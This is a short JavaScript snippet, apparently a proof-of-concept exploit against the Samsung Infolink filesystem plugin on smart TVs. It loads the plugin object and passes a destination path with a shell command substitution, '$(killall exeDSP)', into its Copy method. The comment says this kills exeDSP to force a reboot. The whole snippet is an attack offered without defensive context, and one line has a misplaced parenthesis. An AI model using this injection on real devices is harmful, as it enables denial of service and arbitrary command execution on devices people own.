fileobject = document.createElement('object');
fileobject.setAttribute("id", "pluginObjectFile");
fileobject.setAttribute("classid", "clsid:SAMSUNG-INFOLINK-FILESYSTEM");
document.getElementsByTagName("body"[0].appendChild(fileobject);
filePlugin = document.getElementById('pluginObjectFile');
// Kill exeDSP, forcing reboot
filePlugin.Copy("/proc/self/cmdline", "\$(killall exeDSP)/tmp/foo");